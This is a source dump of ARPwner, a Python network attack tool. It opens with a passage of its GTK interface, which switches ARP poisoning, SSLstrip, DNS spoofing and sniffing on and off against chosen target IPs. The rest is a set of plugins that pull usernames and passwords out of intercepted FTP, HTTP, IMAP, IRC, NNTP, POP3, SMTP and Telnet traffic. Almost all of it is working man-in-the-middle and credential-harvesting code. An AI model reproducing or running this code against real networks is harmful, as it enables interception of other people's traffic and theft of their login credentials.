    def httpStrip(self,widget):
        if (self.httpspwn.running == False):
            self.httpspwn.start()
            self.lblStrip.set_text('SSLstrip: ON')
        else:
            self.lblStrip.set_text('SSLstrip: OFF')
            self.httpspwn.stop()
            self.httpspwn = httpstrip.run_server(self.logger)


    def addTarget(self, treeview, iter, *args):
        model=treeview.get_model()
        iter = model.get_iter(iter)
        ip = model.get_value(iter, 0)
        self.arp.addipTarget(ip)
        self.targetsList.append([ip])
        self.networkList.remove(iter)

    def remTarget(self, treeview, iter, *args):
        model=treeview.get_model()
        iter = model.get_iter(iter)
        ip = model.get_value(iter, 0)
        self.arp.remipTarget(ip)
        self.networkList.append([ip])
        self.targetsList.remove(iter)


    def statusPlugin(self, treeview, iter, *args):
        model=treeview.get_model()

        iter = model.get_iter(iter)
        enabled = model.get_value(iter, 0)
        name = model.get_value(iter, 1)
        if enabled == True:
            self.plugins.disablePlugin(name)
            self.pluginsList.set_value(iter,0,False)
        else:
            self.plugins.enablePlugin(name)
            self.pluginsList.set_value(iter,0,True)
            

    def dnsRun(self,widget):
        if self.dnsSpoof.running == False:
            self.dnsSpoof.running = True
            self.lblDns.set_text('DNS spoofing: ON')
        else:
            self.dnsSpoof.running = False
            self.lblDns.set_text('DNS spoofing: OFF')

    def showAbout(self,widget):
        wTree=gtk.glade.XML(gladefile,"dialog")
        response = wTree.get_widget("dialog").run()
        if response == gtk.RESPONSE_DELETE_EVENT or response == gtk.RESPONSE_CANCEL:
            wTree.get_widget("dialog").hide()

    def load(self):
        global passwdList
        """
        In this function we are going to display the Main
        window and connect all the signals
        """
        self.wTree=gtk.glade.XML(gladefile,"Main")

        dic = {"on_Main_destroy" : self.exit
            , "on_cmdIface_activate" : self.setIface
            , "on_cmdScan_activate" : self.scanNetwork
            , "on_cmdSniff_activate" : self.startSniff
            , "on_cmdArp_activate" : self.arpPoison
            , "on_cmdStrip_activate": self.httpStrip
            , "on_lstNetwork_row_activated": self.addTarget
            , "on_lstTargets_row_activated": self.remTarget
            , "on_lstPlugins_row_activated": self.statusPlugin
            , "on_lstDns_button_press_event": self.dnsHandler
            , "on_lstPlugins_button_press_event":self.pluginHandler
            , "on_cmdSpoof_activate": self.dnsRun
            , "on_cmdAbout_activate": self.showAbout
            , "on_lstDns_row_activated": self.remDns}
        self.wTree.signal_autoconnect(dic)

        #create and load the lstpassword columns
        self.lstPasswords = self.wTree.get_widget("lstPasswords")
        passwdList = gtk.ListStore(str, str, str, str)
        self.lstPasswords.set_model(passwdList)

        self.addlistColumn(self.lstPasswords,'Protocol', 0)
        self.addlistColumn(self.lstPasswords,'Hostname', 1)
        self.addlistColumn(self.lstPasswords,'User', 2)
        self.addlistColumn(self.lstPasswords,'Password', 3)

        # create and load the lstNetwork columns
        self.lstNetwork = self.wTree.get_widget("lstNetwork")
        self.networkList = gtk.ListStore(str)
        self.lstNetwork.set_model(self.networkList)
        self.addlistColumn(self.lstNetwork,'IP',0)

        
        self.lstTargets = self.wTree.get_widget("lstTargets")
        self.targetsList = gtk.ListStore(str)
        self.lstTargets.set_model(self.targetsList)
        self.addlistColumn(self.lstTargets,'IP',0)

        #create and load the lstPlugins columns
        self.lstPlugins = self.wTree.get_widget("lstPlugins")
        self.pluginsList = gtk.ListStore(bool,str,str,str)
        self.lstPlugins.set_model(self.pluginsList)
        self.addlistColumn(self.lstPlugins,'Enabled',0)
        self.addlistColumn(self.lstPlugins,'Name',1)
        self.addlistColumn(self.lstPlugins,'Desc',2)
        self.addlistColumn(self.lstPlugins,'Author',3)



        #create and load the lstDns columns
        self.lstDns = self.wTree.get_widget("lstDns")
        self.dnsList = gtk.ListStore(str,str)
        self.lstDns.set_model(self.dnsList)
        self.addlistColumn(self.lstDns,'DNS',0)
        self.addlistColumn(self.lstDns,'Ip',1)

        #load the status labels
        self.lblArp = self.wTree.get_widget("lblArp")
        self.lblSniffing = self.wTree.get_widget("lblSniffing")
        self.lblStrip = self.wTree.get_widget("lblStrip")
        self.lblDns = self.wTree.get_widget("lblDns")
        self.loadPlugins()

    def loadPlugins(self):
        for plugin in self.plugins.plugins:
            self.pluginsList.append([plugin.PROPERTY['ENABLED'],plugin.PROPERTY['NAME'],plugin.PROPERTY['DESC'], plugin.PROPERTY['AUTHOR']])

    def pluginHandler(self,widget,event):
        if event.button == 3:
            menu = gtk.Menu()
            add = gtk.MenuItem("Config")
            add.show()
            add.connect("activate",self.configPlugin)
            menu.append(add)
            menu.popup(None, None, None, event.button, event.time, None)

    def configPlugin(self,widget):
        model=self.lstPlugins.get_model()
        entry1, entry2 =  self.lstPlugins.get_selection().get_selected()
        name = entry1.get_value(entry2, 1)
        for plugin in self.plugins.plugins:
            if name == plugin.PROPERTY['NAME']:
                try:
                    plugin.configure().run()
                except:
                    pass

    def dnsHandler(self,widget,event):
        if event.button == 3:
            menu = gtk.Menu()
            add = gtk.MenuItem("Add")
            add.show()
            add.connect("activate",self.addDns)
            menu.append(add)
            menu.popup(None, None, None, event.button, event.time, None)

    def addDns(self,widget):
        result,domain,ip = dnsDialog().run()
        if (result == gtk.RESPONSE_OK and len(domain)>1 and len(ip)>1):
            self.dnsSpoof.addDomain(domain,ip)
            self.dnsList.append([domain,ip])

    def remDns(self, treeview, iter, *args):
        model=treeview.get_model()
        iter = model.get_iter(iter)
        dns = model.get_value(iter, 0)
        self.dnsSpoof.remDomain(dns)
        self.dnsList.remove(iter)

    def setIface(self,widget):
        result,iface = ifaceDialog().run()
        if (result == gtk.RESPONSE_OK and iface != None):
            self.iface = iface
            try:
                self.arp = arp.ARP(self.iface)
                self.sniff = sniff.sniff(self.iface, self.logger, self.plugins,self.dnsSpoof)
                self.startSniff(None)
            except(OSError):
                messageBox('Error while creating the class sniff and arp on setIface function')
                self.iface = None
        elif iface == None:
            messageBox('Error setting the iface')


class ifaceDialog:
    """This class shows the iface dialog"""

    def run(self):
        self.wTree = gtk.glade.XML(gladefile, "ifaceDlg")
        self.dlg = self.wTree.get_widget("ifaceDlg")

        self.iface = self.wTree.get_widget("cmbIface")
        self.lstIface = gtk.ListStore(str)

        interfaces = ifaces.getIfaces().interfaces

        for iface in interfaces:
            self.lstIface.append([iface.name])
            #print iface.name, iface.ip , iface.hwaddr, iface.gateway, iface.gwhwaddr

        self.iface.set_model(self.lstIface)
        cell = gtk.CellRendererText()
        self.iface.pack_start(cell)
        self.iface.add_attribute(cell,'text',0)
        self.iface.set_active(0)

        self.result = self.dlg.run()
        ifname = self.iface.get_active_text()
        self.iface = None
        self.dlg.destroy()
        for iface in interfaces:
            if iface.name == ifname:
                return self.result, iface
        return None,None

class scanDialog:
    """This class shows the scan dialog"""
		
    def run(self):
        self.wTree = gtk.glade.XML(gladefile, "scanDlg")
        self.dlg = self.wTree.get_widget("scanDlg")
        self.ip1 = self.wTree.get_widget("txtIp1")
        self.ip2 = self.wTree.get_widget("txtIp2")
        self.result = self.dlg.run()
        self.ip1 = self.ip1.get_text()
        self.ip2 = self.ip2.get_text()
        self.dlg.destroy()
        return self.result,self.ip1,self.ip2

class dnsDialog:
    """This class shows the DNS add dialog"""
		
    def run(self):
        self.wTree = gtk.glade.XML(gladefile, "dnsDlg")
        self.dlg = self.wTree.get_widget("dnsDlg")
        self.domain = self.wTree.get_widget("txtDomain")
        self.ip = self.wTree.get_widget("txtIp")
        self.result = self.dlg.run()
        self.domain = self.domain.get_text()
        self.ip = self.ip.get_text()
        self.dlg.destroy()
        return self.result,self.domain,self.ip

class messageBox:
    def __init__(self, lblmsg = '',dlgtitle = 'Error!'):
        self.wTree = gtk.glade.XML(gladefile, "msgBox")
        self.dlg = self.wTree.get_widget('msgBox')
        self.lblError = self.wTree.get_widget('lblError')
        self.dlg.set_title(dlgtitle)
        self.lblError.set_text(lblmsg)
        handlers = {'on_cmdOk_clicked':self.done}
        self.wTree.signal_autoconnect(handlers)

    def done(self,widget):
        self.dlg.destroy()


if __name__ == "__main__":
    if not os.geteuid() == 0:
        sys.exit("[-] ARPwner must run as root")
    if (os.name == "nt"):
        sys.exit("[-] ARPwner does not support windows")
    arpGui()
    gtk.main()

########NEW FILE########
__FILENAME__ = ftp
"""FTP password logger"""
PROPERTY={}
PROPERTY['NAME']="FTP Logger"
PROPERTY['DESC']="This logs all the FTP accounts"
PROPERTY['AUTHOR']='ntrippar'
PROPERTY['ENABLED']=True
PROPERTY['TYPE']='TCP'
PROPERTY['SPORT']=21
PROPERTY['DPORT']=21
user = None
passwd = None

class plugin():
    def __init__(self, traffic, logger):
        self.traffic = traffic
        self.logger = logger
    
    def analyze(self):
        global user, passwd
        data = self.traffic.data.data
        lines = data.split('\r\n')

        for line in lines:
            if(line[:4].lower() == "user"):
                user = line[5:]
            elif(line[:4].lower() == "pass"):
                passwd = line[5:]

        if (user != None and passwd != None):
            self.logger.addInfo('FTP',self.traffic.dst,user,passwd)
            user = None
            passwd = None

########NEW FILE########
__FILENAME__ = http
import Libs.dpkt as dpkt
from Engine import analyzepost

"""HTTP password logger"""
PROPERTY={}
PROPERTY['NAME']="HTTP Account Logger"
PROPERTY['DESC']="This logs all the HTTP accounts"
PROPERTY['AUTHOR']="ntrippar"
PROPERTY['ENABLED']=True
PROPERTY['TYPE']='TCP'
PROPERTY['SPORT']=00
PROPERTY['DPORT']=80

analyzeData = analyzepost.analyzePost()

class plugin():
    def __init__(self, traffic, logger):
        self.traffic = traffic
        self.logger = logger
    
    def analyze(self):
        data = self.traffic.data.data
        if self.traffic.data.dport == 80 and len(data) > 0:
            try:
                http = dpkt.http.Request(data)
                if len(http.body)>0:
                    analyzeData.analyze(self.logger, http.body, http.headers['host'])

            except (dpkt.dpkt.NeedData, dpkt.dpkt.UnpackError):
                pass
    

########NEW FILE########
__FILENAME__ = imap
"""IMAP password logger"""
PROPERTY={}
PROPERTY['NAME']="IMAP Logger"
PROPERTY['DESC']="This logs all the IMAP accounts"
PROPERTY['AUTHOR']='localh0t'
PROPERTY['ENABLED']=True
PROPERTY['TYPE']='TCP'
PROPERTY['SPORT']=143
PROPERTY['DPORT']=143
user = None
passwd = None

class plugin():
    def __init__(self, traffic, logger):
        self.traffic = traffic
        self.logger = logger
    
    def analyze(self):
        global user, passwd
        data = self.traffic.data.data
        lines = data.split('\r\n')
        for line in lines:
            if(line[:10].lower() =="a001 login"):
            	line = line.split(' ')
            	user, passwd = line[2], line[3]
        if (user != None and passwd != None):
                self.logger.addInfo('IMAP',self.traffic.dst,user,passwd)
                user = None
                passwd = None

########NEW FILE########
__FILENAME__ = irc
import base64
"""IRC password logger"""
PROPERTY={}
PROPERTY['NAME']="IRC Logger"
PROPERTY['DESC']="This logs all the IRC accounts"
PROPERTY['AUTHOR']='localh0t'
PROPERTY['ENABLED']=True
PROPERTY['TYPE']='TCP'
PROPERTY['SPORT']=6667
PROPERTY['DPORT']=6667
user = None
passwd = None

class plugin():
    def __init__(self, traffic, logger):
        self.traffic = traffic
        self.logger = logger
    
    def analyze(self):
        global user, passwd, count

        data = self.traffic.data.data
        lines = data.split('\r\n')
        for line in lines:
            if(line[:4].lower() == "nick"):
            	user = line[5:]
            elif(line[:11].lower() == "ns identify"):
                passwd = line[12:]
        if (user != None and passwd != None):
                self.logger.addInfo('IRC',self.traffic.dst,user,passwd)
                user = None
                passwd = None

########NEW FILE########
__FILENAME__ = nntp
"""NNTP password logger"""
PROPERTY={}
PROPERTY['NAME']="NNTP Logger"
PROPERTY['DESC']="This logs all the NNTP accounts"
PROPERTY['AUTHOR']='localh0t'
PROPERTY['ENABLED']=True
PROPERTY['TYPE']='TCP'
PROPERTY['SPORT']=119
PROPERTY['DPORT']=119
user = None
passwd = None

class plugin():
    def __init__(self, traffic, logger):
        self.traffic = traffic
        self.logger = logger
    
    def analyze(self):
        global user, passwd
        data = self.traffic.data.data
        lines = data.split('\r\n')
        for line in lines:
            if(line[:7].lower() =="xsecret"):
            	line = line.split(' ')
            	user, passwd = line[1], line[2]
        if (user != None and passwd != None):
                self.logger.addInfo('NNTP',self.traffic.dst,user,passwd)
                user = None
                passwd = None

########NEW FILE########
__FILENAME__ = pop3
"""POP3 password logger"""
PROPERTY={}
PROPERTY['NAME']="POP3 Logger"
PROPERTY['DESC']="This logs all the POP3 accounts"
PROPERTY['AUTHOR']='localh0t'
PROPERTY['ENABLED']=True
PROPERTY['TYPE']='TCP'
PROPERTY['SPORT']=110
PROPERTY['DPORT']=110
user = None
passwd = None

class plugin():
    def __init__(self, traffic, logger):
        self.traffic = traffic
        self.logger = logger
    
    def analyze(self):
        global user, passwd
        data = self.traffic.data.data
        lines = data.split('\r\n')
        for line in lines:
            if(line[:4].lower() == "user"):
                user = line[5:]
            elif(line[:4].lower() == "pass"):
                passwd = line[5:]
            elif(line[:4].lower() == "apop"):
            	line = line.split(' ')
            	user, passwd = line[1], line[2]
        if (user != None and passwd != None):
                self.logger.addInfo('POP3',self.traffic.dst,user,passwd)
                user = None
                passwd = None

########NEW FILE########
__FILENAME__ = smtp
import base64
"""SMTP password logger"""
PROPERTY={}
PROPERTY['NAME']="SMTP Logger"
PROPERTY['DESC']="This logs all the SMTP accounts"
PROPERTY['AUTHOR']='localh0t'
PROPERTY['ENABLED']=True
PROPERTY['TYPE']='TCP'
PROPERTY['SPORT']=25
PROPERTY['DPORT']=25
user = None
passwd = None
count = 0

class plugin():
    def __init__(self, traffic, logger):
        self.traffic = traffic
        self.logger = logger
    
    def analyze(self):
        global user, passwd, count

        data = self.traffic.data.data
        lines = data.split('\r\n')
        for line in lines:
            # next packet will be username
            if("VXNlcm5hbWU6" in line):
                count = 1
            # next packet will be password
            if("UGFzc3dvcmQ6" in line):
                count = 2
            elif(line[:10].lower() == "auth plain"):
            	line = line.split(' ')
            	try:
            	    # authid\x00userid\x00passwd
            	    auth_string = base64.b64decode(line[2]).split("\x00")
            	    user = auth_string[1]
            	    passwd = auth_string[2]
            	except(TypeError): pass
        # set username and password
        if(count == 1 and line != ""):
        	user = base64.b64decode(line)
        	count = 0
        if(count == 2 and line != ""):
        	passwd = base64.b64decode(line)
        	count = 0
        if (user != None and passwd != None):
                self.logger.addInfo('SMTP',self.traffic.dst,user,passwd)
                user = None
                passwd = None

########NEW FILE########
__FILENAME__ = telnet
"""Telnet password logger"""
PROPERTY={}
PROPERTY['NAME']="Telnet Logger"
PROPERTY['DESC']="This logs all the Telnet accounts"
PROPERTY['AUTHOR']='localh0t'
PROPERTY['ENABLED']=True
PROPERTY['TYPE']='TCP'
PROPERTY['SPORT']=23
PROPERTY['DPORT']=23
user = None
passwd = None

class plugin():
    def __init__(self, traffic, logger):
        self.traffic = traffic
        self.logger = logger
    
    def analyze(self):
        global user, passwd
        data = self.traffic.data.data
        lines = data.split('\r\n')
        for line in lines:
            if(line[:4].lower() == "user"):
                user = line[5:]
            elif(line[:4].lower() == "pass"):
                passwd = line[5:]
        if (user != None and passwd != None):
                self.logger.addInfo('Telnet',self.traffic.dst,user,passwd)
                user = None
                passwd = None

########NEW FILE########
